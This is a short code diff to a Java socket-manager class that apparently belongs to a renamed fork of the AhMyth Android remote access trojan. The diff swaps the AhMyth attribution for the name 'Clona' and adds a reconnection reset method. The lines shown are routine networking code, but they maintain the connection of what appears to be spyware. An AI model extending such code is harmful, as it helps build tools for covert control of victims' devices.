@@ -8,7 +8,7 @@ import io.socket.client.Socket;
 
 
 /**
- * Created by AhMyth on 10/14/16.
+ * Socket Manager - Clona
  */
 public class IOSocket {
     private static IOSocket ourInstance = new IOSocket();
@@ -40,6 +40,14 @@ public class IOSocket {
         return ioSocket;
     }
 
+    // Reset the socket instance for reconnection recovery
+    public static void resetInstance() {
+        if (ourInstance != null && ourInstance.ioSocket != null) {
+            ourInstance.ioSocket.disconnect();
+            ourInstance.ioSocket.close();
+        }
+        ourInstance = new IOSocket();
+    }
 
 
 
